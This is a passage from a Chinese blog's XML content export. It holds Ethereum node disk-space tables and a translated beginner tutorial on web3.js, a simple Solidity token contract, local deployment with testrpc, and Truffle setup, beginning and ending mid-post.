ok := f.callbacks[cKey&#123;f.current, callbackEnterState&#125;]; ok &#123;</span><br><span class="line">        fn(e)</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> fn, ok := f.callbacks[cKey&#123;<span class="string">&quot;&quot;</span>, callbackEnterState&#125;]; ok &#123;</span><br><span class="line">       fn(e)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="comment">//执行</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f *FSM)</span> <span class="title">Transition</span><span class="params">()</span> <span class="title">error</span></span>&#123;</span><br><span class="line">     <span class="keyword">return</span> f.doTransition()</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f *FSM)</span> <span class="title">doTransition</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">  <span class="keyword">return</span> f.transitionerObj.transition(f)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title>以太坊磁盘空间</title>
    <url>/2019/12/04/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4/</url>
    <content><![CDATA[<p>refer link==&gt; <a href="https://ethereum.stackexchange.com/questions/143/what-are-the-ethereum-disk-space-needs">https://ethereum.stackexchange.com/questions/143/what-are-the-ethereum-disk-space-needs</a></p>
<p>Update on Dec 9th, 2018 / Block ~ 6_850_000</p>
<h3 id="Geth-Go"><a href="#Geth-Go" class="headerlink" title="Geth (Go)"></a>Geth (Go)</h3><p><em>Last Update: May 14th, 2018 / Block ~ 5_600_000</em></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Client / Mode         | Block <span class="built_in">Number</span>   | Disk Space</span><br><span class="line">======================|================|===========</span><br><span class="line">geth light            | <span class="number">5_600_000</span>      | <span class="number">363</span>M</span><br><span class="line">geth fast full        | <span class="number">5_600_000</span>      | <span class="number">142</span>G</span><br><span class="line">geth full full        | <span class="number">4_980_000</span> [<span class="number">1</span>]  | <span class="number">239</span>G + [<span class="number">1</span>]</span><br><span class="line">geth full archive     | <span class="number">4_980_000</span> [<span class="number">2</span>]  | <span class="number">671</span>G</span><br></pre></td></tr></table></figure>

<ul>
<li>Geth 1.8.3</li>
<li>Ubuntu 16.4 LTS, VPS instance with SSD backed storage</li>
</ul>
<h3 id="Parity-Rust"><a href="#Parity-Rust" class="headerlink" title="Parity (Rust)"></a>Parity (Rust)</h3><p><em>Last Update: May 14th, 2018 / Block ~ 5_600_000</em></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Client / Mode         | Block <span class="built_in">Number</span>   | Disk Space</span><br><span class="line">======================|================|===========</span><br><span class="line">parity light          | <span class="number">5_600_000</span>      |  <span class="number">89</span>M</span><br><span class="line">parity warp fast      | <span class="number">5_600_000</span>      |  <span class="number">82</span>G</span><br><span class="line">parity full fast      | <span class="number">5_600_000</span>      |  <span class="number">78</span>G</span><br><span class="line">parity full archive   | <span class="number">5_600_000</span>      | <span class="number">1.1</span>T</span><br></pre></td></tr></table></figure>

<ul>
<li>Parity 1.10.0</li>
<li>Ubuntu 16.4 LTS, VPS instance with SSD backed storage</li>
</ul>
]]></content>
      <tags>
        <tag>Ethereum</tag>
        <tag>Infrastructure</tag>
      </tags>
  </entry>
  <entry>
    <title>以太坊编程_I</title>
    <url>/2018/02/24/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%BC%96%E7%A8%8B-I/</url>
    <content><![CDATA[<p><strong>目录</strong></p>
<ol>
<li><p><a href="https://willzhuang.github.io/2018/02/24/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%BC%96%E7%A8%8B-I/">迈出第一步</a></p>
</li>
<li><p><a href="https://willzhuang.github.io/2018/02/24/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%BC%96%E7%A8%8B-II/">与合约进行交互</a></p>
</li>
<li><p><a href="https://willzhuang.github.io/2018/02/24/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%BC%96%E7%A8%8B-III/">现实世界中的构架和工具</a></p>
</li>
</ol>
<p><strong>第一步</strong></p>
<p>假设你已经有一些计算机编程方面的基础知识，并知道区块链数据结构是怎样的。如果不具备，请先了解<a href="http://ethfans.org//">ethfans</a>的内容再回来看这篇博客。</p>
<p><strong>以太坊</strong></p>
<p>以太坊是一个开源的，分布式的，基于区块链技术的公共平台，无需审查及第三方干扰即可运行应用程序。</p>
<p><strong>智能合约</strong></p>
<p>智能合约仅仅是电脑程序。我们基于智能合约创建以太坊应用。虽然这个概念现在随着以太坊大红大紫，但是它实际上是由Nick Szabo于1996年提出。</p>
<p><strong>EVM 以太坊虚拟机</strong></p>
<p>EVM 是以太坊智能合约的沙盒运行时,是一个完全独立的环境。这意味着每个在EVM中运行的智能合约无法连接网络，无法调用文件系统和其他进程。</p>
<p><strong>Gas</strong></p>
<p>鉴于以太坊是一个分布式平台，所以必须有一种方式来限定智能合约的可用资源，否则整个网络的算力瘫痪都可能会被耗尽。Gas 通过为EVM中的每个指令确定执行成本来解决问题。重要的是，网络中的每笔交易都有一个“Gas预算”。如果预算的Gas用完了，交易将以失败告终，但是这笔交易仍然会被加载到区块链中。</p>
<p><strong>Ether（ETH）</strong></p>
<p>这是以太坊的加密数字货币。Gas／Ether的兑换价格用来衡量一个操作将花费多少ETH。执行交易所需支付的费用通过Gas用量与Gas价格相乘得出（计算所得的费用将使用ETH支付）。你可以将交易的Gas价格设置为任何值。但是，如果你设置的Gas价格太低的话，没有人会执行你的代码。</p>
<p><strong>账户</strong></p>
<p>每个账户都是由一个地址标识的。同一地址空间由两种账户共享。一种是由公私钥对控制的外部账户，该账户通常由用户持有，用来存储ETH。另一种是合约账户，合约账户下存储着智能合约的代码。重要的是，只有外部账户才能启动交易。</p>
<p><strong>交易</strong></p>
<p>交易是从一个账户发送到另一个账户的消息。消息内容可以是转移ETH。如果目的账户是合约账户，其智能合约代码将被执行。有关智能合约代码执行的每一笔交易将在网络中的所有节点上执行。所有的智能合约代码运行以及交易执行都将被记录在以太坊区块链上。</p>
<p><strong>Solidity</strong></p>
<p>Solidity 是一种面向合约的高级语言，其语法与JavaScript相似。Solidity是静态类型的，支持继承，库以及复杂的用户定义类型。编译后就是节点运行的EVM程序集。</p>
<p><strong>WEB3</strong><br>先通过简单的将ETH从一个账户发送到另一个账户开始与以太坊互动。因为刚开始，我们可能会弄的一团糟，所以不想用真正的ETH来做这个实验，经过搜索，发现了testrpc，这是一个用于测试和开发的以太坊客户端，是由npm管理的。让我们安装这个客户端并开始使用它：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install -g ethereumjs-testrpc</span><br><span class="line">testrpc</span><br></pre></td></tr></table></figure>

<p>你会注意到testrpc已经产生了10个地址，这些地址都拥有虚拟的ETH可供测试无需担心。有一点是testrpc的状态并不稳定，每次关闭后，节点和账户状态将被清除。</p>
<p><a href="https://github.com/ethereum/wiki/wiki/JavaScript-API">Web3.js</a> 是一个实现了以太坊 JSON RPC 的JavaScript库。我们将使用Web3.js与以太坊节点（在这个例子中是testrpc）进行交互。安装只需运行：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install -g web3@0.20.1</span><br></pre></td></tr></table></figure>

<p>顺便提一句，在这个例子中，安装 Web3 0.20.x 版本而不是公测1.0.0版本。首先，需要将本地testrpc测试节点连接到Web3.js,为了做到这一点，我们要求Web3 使用localhost provider。让我们打开一个节点控制台并输入以下命令：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Web3 = <span class="built_in">require</span>(<span class="string">&#x27;web3&#x27;</span>)</span><br><span class="line">provider = <span class="keyword">new</span> Web3.providers.HttpProvider(<span class="string">&quot;http://localhost:8545&quot;</span>)</span><br><span class="line">web3 = <span class="keyword">new</span> Web3(provider)</span><br></pre></td></tr></table></figure>

<p>我们正在使用默认的testrpc端口（8545），如果你设置了另一个端口，记得更改provider的URL。当你获得web3 实例后，首先运行以下命令以获得你的以太坊节点中的账户列表及其各自余额：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">web3.eth.accounts.forEach(<span class="function"><span class="params">account</span> =&gt;</span> &#123;</span><br><span class="line">balance = web3.eth.getBalance(account);</span><br><span class="line"><span class="built_in">console</span>.log(balance);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>你可能注意到了，输出不全是数字列表，这是因为Web3使用大数对象来处理数字值，而JavaScript无法正确处理大数类型。可以通过这个<a href="https://github.com/ethereum/wiki/wiki/JavaScript-API#a-note-on-big-numbers-in-web3js">链接</a>了解更多。</p>
<p>同时，这些余额不是用ETH表示的，实际上它们的单位都是基本单位wei。1ETH是10¹⁸ wei。</p>
<p>回到刚刚的话题，让我们试着在两个账户之间发送ETH。指需输入web3.eth.accounts并选择其中的两个，你可以使用sendTransaction方法：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> = web3.eth.accounts[<span class="number">0</span>]</span><br><span class="line">to = web3.eth.accounts[<span class="number">1</span>]</span><br><span class="line">transaction = &#123; <span class="attr">from</span>: <span class="keyword">from</span>, <span class="attr">to</span>: to, <span class="attr">value</span>: <span class="number">100000</span> &#125;</span><br><span class="line">transactionHash = web3.eth.sendTransaction(transaction)</span><br></pre></td></tr></table></figure>

<p>命令输出的是交易哈希，你也可以通过以下命令获得交易信息：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">web3.eth.getTransaction(transactionHash)</span><br></pre></td></tr></table></figure>

<p>你可能还想检查你使用的账户的余额是否已经更改。你可以使用下面的命令来验证：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">web3.eth.accounts.forEach(<span class="function"><span class="params">account</span> =&gt;</span> &#123;</span><br><span class="line">balance = web3.eth.getBalance(account);</span><br><span class="line"><span class="built_in">console</span>.log(balance);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>接下来，我使用HTML和jQuery以及一点Bootstrap搭建了一个简单的UI使得它更美观一点。你可以在<a href="https://github.com/WillZhuang/ethereum-spiking/tree/master/1-interacting-with-the-blockchain">repo</a>中看看它。这就是所说的DApp即分布式应用。也就是说，一个部分后端代码运行在分布式点对点网络上的应用程序；在这个例子中，分布式点对点网络是指以太坊网络。</p>
<p><img src="/2018/02/24/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%BC%96%E7%A8%8B-I/1.jpeg"></p>
<p><em>上图是用以测试ETH交易的DApp的UI</em></p>
<p>你将找到UI的index.html文件以及与以太坊交互的app.js文件，这基本上就是我们前面所描述的用一些jQuery回调来填充UI。可以复制repo并运行起来试一下。</p>
<p>谢谢你阅读这篇博客，如果你有任何问题，意见或者建议欢迎告诉我！如果你喜欢这篇博客，请继续关注本指南的第二部分，我将重点介绍智能合约！</p>
<p>谢谢<a href="https://medium.com/@maraoz?source=post_page">Manuel Araoz</a></p>
<blockquote>
<p>原文链接: <a href="https://blog.zeppelin.solutions/a-gentle-introduction-to-ethereum-programming-part-1-783cc7796094">https://blog.zeppelin.solutions/a-gentle-introduction-to-ethereum-programming-part-1-783cc7796094</a></p>
<p>作者: Facu Spagnuolo</p>
</blockquote>
]]></content>
      <tags>
        <tag>solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>以太坊编程_II</title>
    <url>/2018/02/24/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%BC%96%E7%A8%8B-II/</url>
    <content><![CDATA[<p><strong>目录</strong></p>
<ol>
<li><p><a href="https://willzhuang.github.io/2018/02/24/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%BC%96%E7%A8%8B-I/">迈出第一步</a></p>
</li>
<li><p><a href="https://willzhuang.github.io/2018/02/24/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%BC%96%E7%A8%8B-II/">与合约进行交互</a></p>
</li>
<li><p><a href="https://willzhuang.github.io/2018/02/24/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%BC%96%E7%A8%8B-III/">现实世界中的构架和工具</a></p>
</li>
</ol>
<p><strong>2.尝试与合约进行交互</strong></p>
<p><strong>2.1以太坊智能合约介绍</strong></p>
<p>阅读到这里，对以太坊已经有了基础的了解，已经与以太坊节点进行了交互，并在账户之间发送了一些交易等等。但除此之外，让以太坊如此惊艳的还有：智能合约。</p>
<p>正如我在简介中所说，智能合约是一个运行在以太坊虚拟机（EVM）上的程序。你可以创建智能合约来做任何你想做的事情，但是在今天，大多数智能合约都被用于像I-C-Os或者代币销售那样的众筹工具。接下来请允许我解释这些概念。</p>
<p>从众筹开始说起，相信这是一个你非常熟悉的概念。举办众筹活动的项目，其目的是为了开展项目而筹集资金。你可以几乎零成本的发行一种与你的项目相关的数字资产，并将其出售给任何人。这就是我们所说的初始代币发行（I-C-O）。</p>
<p>要想实现一个具有智能合约的I-C-O，你只需要实现使你的数字资产可交易并且有价值的逻辑。这听起来不错，这些就是以太坊代币，是以太坊生态系统中的一种数字资产。</p>
<p>接下来让我们试着通过一个例子来分析这些例子。</p>
<p>假设你的健康食品公司想要推出一种新的品牌。你决定进行一次I-C-O来筹集20,000个ETH。你用10个代币换取你收集到的每个ETH，并承诺，贡献者可以在你的商店使用这些代币购买食物。为此，你需要开发一个代币智能合约为每个贡献者存储他们相应的代币数量。</p>
<p>现在，假设你筹集到了这笔钱，开展了你的项目并开了你的第一家店。然后，你决定每份沙拉以1个代币的价格出售。一周以后，你的客人越来越多，但是沙拉的供应却是有限的，客人意识到这一点并开始把你的代币当作资产交易，从而提高了其市场价值。</p>
<p>这一过程在现实生活中实际存在，因为以太坊几乎允许任何人创建他们自己的可交易的数字资产。</p>
<p><strong>2.2你的第一个智能合约</strong></p>
<p>让我们看看如何建立一种基本的以太坊代币吧。我将通过这个例子介绍一些Solidity的基础知识。</p>
<p>请记住这个例子仅用于学习，不能使用它从事商业活动。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line">contract MyToken &#123;</span><br><span class="line"> address public creator;</span><br><span class="line"> uint256 public totalSupply;</span><br><span class="line"> mapping (address &#x3D;&gt; uint256) public balances;</span><br><span class="line"> </span><br><span class="line"> function MyToken() public &#123;</span><br><span class="line">   creator &#x3D; msg.sender;</span><br><span class="line">   totalSupply &#x3D; 10000;</span><br><span class="line">   balances[creator] &#x3D; totalSupply;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> function balanceOf(address owner) public constant returns(uint256)&#123;</span><br><span class="line">   return balances[owner];</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> function sendTokens(address receiver, uint256 amount) public returns(bool)&#123;</span><br><span class="line">   address owner &#x3D; msg.sender;</span><br><span class="line"></span><br><span class="line">   require(amount &gt; 0);</span><br><span class="line">   require(balances[owner] &gt;&#x3D; amount);</span><br><span class="line"></span><br><span class="line">   balances[owner] -&#x3D; amount;</span><br><span class="line">   balances[receiver] +&#x3D; amount;</span><br><span class="line">   return true;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>让我们一步步来。<em>pragma</em>关键词显示了你使用的源码的Solidity版本。然后，用合约的名字进行合约定义初始化，在这个例子中，名字就是<em>MyToken</em>。</p>
<p>接下来，你可以看到三个变量：</p>
<p><em>creator</em> 是一个地址变量，用于存储该合约的拥有者。</p>
<p><em>TotalSupply</em> 是一个256位的无符号整数，用于存储愿意与投资者共享的代币总数。</p>
<p><em>balance</em> 是从地址到无符号整数的映射，其记录着每个投资者的余额。</p>
<p>之后，你将看到构造函数。正如你所见，这是一个与合约同名的函数，同时每当该合约的一个新的实例被部署在网络中时它将被调用一次。这就是合约的所有者被存储的地方。由于所有的函数调用都是一笔交易，因此可以通过交易的发送者即 <em>msg.sender</em> 获得合约的所有者信息。这个合约定义了总共10,000个代币。</p>
<p>下一个函数十分简单：<em>balanceOf</em> 用于展示参数指定的地址的余额。也许你想知道 <em>constant</em> 关键字是什么意思。这是因为Solidity的函数分为两种，一种是常量函数，一种是非常量函数。</p>
<p>非常量函数执行后状态会发生变化。另一方面，常量函数只读一次，这意味着它不执行任何状态转换，而是只读取数据。实际上，共有两种类型的常量函数：</p>
<p><em>view</em> 声明函数承诺不修改状态（常量的别名）</p>
<p><em>pure</em> 声明函数承诺不读取或者修改状态</p>
<p><em>sendTokens</em> 函数允许我们在地址间交换代币。这是一个非常量函数或者说是一个交易函数，因为使用这个函数将改变余额。该函数的参数是接收者的地址以及欲转移的代币数量，函数的返回值是一个表示交易是否成功执行的布尔（Boolean）类型数据。你可以跳过第一行，它只是把函数的发送者保存在<em>owner</em>变量中。</p>
<p>接下来，你将看到两个先决条件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">require(amount &gt; 0);</span><br><span class="line">require(balances[owner] &gt;&#x3D; amount);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><em>Require</em> 是你可以用来检查条件或者进行验证的方法之一。它将评估一个条件并在条件不满足时恢复原状。因此，在这个例子中，要求被转移的代币 <em>amount</em> 大于零，同时要保证发送者有足够的余额来支付该笔代币转移。</p>
<p>最后，你要从 <em>owner</em> 的余额中减去交易转移的代币数量，并将其添加到 <em>receiver</em> 的余额中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"> balances[owner] -&#x3D; amount;</span><br><span class="line"> balances[receiver] +&#x3D; amount;</span><br><span class="line"> return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>2.3 部署智能合约</strong></p>
<p>现在让我们开始试着玩一下智能合约吧！首先需要在网络上部署智能合约。为了实现部署，需要使用名为 solc的Solidity编译器用于编译node.js。你可以通过以下指令安装它：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install -g solc</span><br></pre></td></tr></table></figure>

<p>创建一个叫做 <em>MyToken.sol</em> 的文件并把合约代码粘贴到文件中，并在放置该文件的路径下打开一个控制终端。首先，通过运行以下指令编译文件：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">solcjs MyToken.sol --bin</span><br></pre></td></tr></table></figure>

<p>执行完该指令，编译器将创建一个 <em>MyToken_sol_MyToken.bin</em> 文件作为输出。你可以看到该文件只包含字节码。接着，你将需要使用solc来构建ABI（应用二进制接口），它是合约的接口或者说模板，通过它你可以获得可用的方法。这就是与Web3的联系点。你只需要运行：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">solcjs MyToken.sol --abi</span><br></pre></td></tr></table></figure>

<p>接着，你将看到一个叫做 <em>MyTolen_sol_MyToken.abi</em> 的新文件，其中包含的JSON内容定义了你的合约的接口。</p>
<p>最后，你只需要使用在后台运行的 <em>testrpc</em> ，通过node.js控制台部署你的合约。你完成了这些工作后，我们就开始初始化 <em>web3</em> 吧：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//instance web3</span></span><br><span class="line">Web3 = <span class="built_in">require</span>(<span class="string">&#x27;web3&#x27;</span>)</span><br><span class="line">provider = <span class="keyword">new</span> Web3.providers.HttpProvider(<span class="string">&quot;http://localhost:8545&quot;</span>)</span><br><span class="line">web3 = <span class="keyword">new</span> Web3(provider)</span><br></pre></td></tr></table></figure>

<p>Web3 为你提供了解析合约ABI的可能性，并提供了一个JavaScriot API 与之交互。接着，你只需使用字节码就可以将该合约的一个新实例部署到 <em>testrpc</em> 上。请按照下面的命令输入：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// load files</span></span><br><span class="line">myTokenABIFile = fs.readFileSync(<span class="string">&#x27;MyToken_sol_MyToken.abi&#x27;</span>)</span><br><span class="line">myTokenABI  = <span class="built_in">JSON</span>.parse(myTokenABIFile.toString())</span><br><span class="line">myTokenBINFile = fs.readFileSync(<span class="string">&#x27;MyToken_sol_MyToken.bin&#x27;</span>)</span><br><span class="line">myTokenByteCode = myTokenBINFile.toString()</span><br><span class="line"><span class="comment">//deploy</span></span><br><span class="line">account = web3.eth.accounts[<span class="number">0</span>]</span><br><span class="line">MyTokenContract = web3.eth.contract(myTokenABI)</span><br><span class="line">contractData = &#123; <span class="attr">data</span>: myTokenByteCode, <span class="attr">from</span>: account, <span class="attr">gas</span>: <span class="number">999999</span> &#125;</span><br><span class="line">deployedContract = MyTokenContract.new(contractData)</span><br></pre></td></tr></table></figure>

<p>最后，你可以通过调用 <em>deployedContract.address</em> 检查新部署的合约地址。请保存该地址，因为将需要使用这个地址与你的合约进行交互 :) 。</p>
<p><strong>2.4 Web3与智能合约</strong></p>
<p>让我们从搜索你的 <em>testrpc</em> 账户余额开始。为此，你首先需要访问已部署的合约实例：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">contractAddress = deployedContract.address</span><br><span class="line">instance = MyTokenContract.at(contractAddress)</span><br><span class="line">web3.eth.accounts.forEach(<span class="function"><span class="params">address</span> =&gt;</span> &#123;</span><br><span class="line"> tokens = instance.balanceOf.call(address)</span><br><span class="line"> <span class="built_in">console</span>.log(address + <span class="string">&quot;: &quot;</span> + tokens)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>正如我们所预期的，第一个账户拥有所有的代币。太棒了！接下来，让我们将一部分代币转移到其他账户：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// send tokens</span></span><br><span class="line">amount = <span class="number">10</span></span><br><span class="line"><span class="keyword">from</span> = web3.eth.accounts[<span class="number">0</span>]</span><br><span class="line">to = web3.eth.accounts[<span class="number">1</span>]</span><br><span class="line">transactionHash = instance.sendTokens(to, amount, &#123; <span class="attr">from</span>: <span class="keyword">from</span> &#125;)</span><br><span class="line"><span class="comment">// checkout balances again</span></span><br><span class="line">web3.eth.accounts.forEach(<span class="function"><span class="params">address</span> =&gt;</span> &#123;</span><br><span class="line"> tokens = instance.balanceOf.call(address)</span><br><span class="line"> <span class="built_in">console</span>.log(address + <span class="string">&quot;: &quot;</span> + tokens)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>你应该可以看到，现在第二个地址有了10个代币！你也可以搜索交易信息，正如你在本指南第一部分所做的那样：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">web3.eth.getTransaction(transactionHash)</span><br></pre></td></tr></table></figure>

<p>我还为这个mini DApp设计了一个简单的UI，你可以在<a href="https://github.com/WillZhuang/ethereum-spiking/tree/master/2-interacting-with-a-contract">这里</a>看到它。你将看到一个包含了我们合约ABI的 <em>MyToken.json</em> 文件。我只是把solidity编译器生成的ABI的内容粘贴到这里面。你还可以看到一个与前一个应用相似的 app.js 文件，但是这个app.js文件还包含了我刚刚向你展示的用于发送代币以及展示账户代币余额详细信息的逻辑。</p>
<p><img src="/2018/02/24/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%BC%96%E7%A8%8B-II/1.jpeg"><br><em>开发的用来测试 MyToken 转账的 DApp 的 UI</em></p>
<p>你也可以下载这个 App 并开始与它游戏。你将被要求提供你开发的合约案例的地址。</p>
<p>注意：为了减轻术语负担，这篇文章中描述的代币并非ERC20标准的代币。如果你不知道什么是ERC20协议代币，我们会在下一篇文章中解释它。</p>
<blockquote>
<p>原文链接: <a href="https://blog.zeppelin.solutions/a-gentle-introduction-to-ethereum-programming-part-2-7bbf15e1a953">https://blog.zeppelin.solutions/a-gentle-introduction-to-ethereum-programming-part-2-7bbf15e1a953</a></p>
<p>作者: Facu Spagnuolo</p>
</blockquote>
]]></content>
      <tags>
        <tag>solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>以太坊第二层协议生态的崛起</title>
    <url>/2020/10/29/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%AC%AC%E4%BA%8C%E5%B1%82%E5%8D%8F%E8%AE%AE%E7%94%9F%E6%80%81%E7%9A%84%E5%B4%9B%E8%B5%B7/</url>
    <content><![CDATA[<p>参考链接==&gt; <a href="https://finance.sina.com.cn/blockchain/roll/2020-10-28/doc-iiznezxr8322941.shtml">https://finance.sina.com.cn/blockchain/roll/2020-10-28/doc-iiznezxr8322941.shtml</a></p>
<p>10月27日，第六届区块链全球峰会于上海开幕，峰会上以太坊创始人Vitalik Buterin演讲表示，以太坊现在已经慢慢成为了真正的生态系统，是能够自我维系的生态系统。每次出现一个问题都能提出解决方案来解决。</p>
<p><img src="/2020/10/29/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%AC%AC%E4%BA%8C%E5%B1%82%E5%8D%8F%E8%AE%AE%E7%94%9F%E6%80%81%E7%9A%84%E5%B4%9B%E8%B5%B7/1.JPG"></p>
<p><img src="/2020/10/29/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%AC%AC%E4%BA%8C%E5%B1%82%E5%8D%8F%E8%AE%AE%E7%94%9F%E6%80%81%E7%9A%84%E5%B4%9B%E8%B5%B7/2.JPG"></p>
<p><img src="/2020/10/29/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%AC%AC%E4%BA%8C%E5%B1%82%E5%8D%8F%E8%AE%AE%E7%94%9F%E6%80%81%E7%9A%84%E5%B4%9B%E8%B5%B7/3.JPG"></p>
<p><img src="/2020/10/29/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%AC%AC%E4%BA%8C%E5%B1%82%E5%8D%8F%E8%AE%AE%E7%94%9F%E6%80%81%E7%9A%84%E5%B4%9B%E8%B5%B7/4.JPG"></p>
<p><img src="/2020/10/29/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%AC%AC%E4%BA%8C%E5%B1%82%E5%8D%8F%E8%AE%AE%E7%94%9F%E6%80%81%E7%9A%84%E5%B4%9B%E8%B5%B7/5.JPG"></p>
<p><img src="/2020/10/29/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%AC%AC%E4%BA%8C%E5%B1%82%E5%8D%8F%E8%AE%AE%E7%94%9F%E6%80%81%E7%9A%84%E5%B4%9B%E8%B5%B7/6.JPG"></p>
]]></content>
  </entry>
  <entry>
    <title>以太坊编程_III</title>
    <url>/2018/02/24/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%BC%96%E7%A8%8B-III/</url>
    <content><![CDATA[<p><strong>目录</strong></p>
<ol>
<li><p><a href="https://willzhuang.github.io/2018/02/24/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%BC%96%E7%A8%8B-I/">迈出第一步</a></p>
</li>
<li><p><a href="https://willzhuang.github.io/2018/02/24/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%BC%96%E7%A8%8B-II/">与合约进行交互</a></p>
</li>
<li><p><a href="https://willzhuang.github.io/2018/02/24/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%BC%96%E7%A8%8B-III/">现实世界中的构架和工具</a></p>
</li>
</ol>
<p><strong>3. 现实世界中的构架和工具</strong></p>
<p>或许你已经注意到了，我们所做的工作大部分都很依赖人力。尽管这是一个新兴产业，但是一些工具将会降低开发难度。下面将介绍其中一部分。</p>
<p><strong>3.1. 通过Truffle部署</strong></p>
<p>目前为止，我们与合约进行交互的唯一方式是通过节点控制台将它们手动部署到一个 testrpc 节点上，再使用 Web3 加载它们。现在，我要向你介绍 Truffle 。它是一个以太坊开发构架，具有调试、部署和测试智能合约等功能。</p>
<p>我们要做的第一件事是通过Truffle部署合约。让我们为此创建一个新的目录，运行以下指令来安装Truffle，启动我们的项目：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ mkdir truffle-experiment</span><br><span class="line">$ <span class="built_in">cd</span> truffle-experiment/</span><br><span class="line">$ npm install truffle@4.0.4</span><br><span class="line">$ npx truffle init</span><br></pre></td></tr></table></figure>

<p>会看见有一些文件夹和文件被创建出来。目录结构如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">truffle-experiment&#x2F;</span><br><span class="line">├── contracts&#x2F;</span><br><span class="line">│   └── Migrations.sol</span><br><span class="line">├── migrations&#x2F;</span><br><span class="line">│   └── 1_initial_migration.js</span><br><span class="line">├── test&#x2F;</span><br><span class="line">├── truffle.js</span><br><span class="line">└── truffle-config.js</span><br></pre></td></tr></table></figure>

<p>智能合约应当放在 <em>contracts</em> 文件夹里。<em>migrations</em> 文件夹中的 javascript 文件将帮助我们把合约部署在网络上。你或许也看见了第一个文件夹中的 <em>Migrations</em> 合约，在这个文件夹中，迁移历史将会存储在区块链上。测试文件夹最初是空的，专门用来保存我们的测试文件。最后，你会看见 truffle.js 和 truffle-config.js 这两个文件。我们先略过它们不谈，你也可以查看<a href="http://truffleframework.com/docs/">文档</a>了解详情。</p>
<p>现在，让我们抛开这些无聊的东西，聚焦于一些有趣的地方。要举例说明我们是如何通过Truffle 部署合约的，可以采用与该指南上一篇文章中相同的代币合约的例子。请复制该代码并将它粘贴至合约文件夹里的 <em>MyToken.sol</em> 文件中。之后，创建一个名为 <em>2_deploy_my_token.js</em> 的新迁移文件，并将下列几行代码复制进去：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> MyToken = artifacts.require(<span class="string">&#x27;./MyToken.sol&#x27;</span>)</span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">deployer</span>) </span>&#123;</span><br><span class="line">  deployer.deploy(MyToken)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

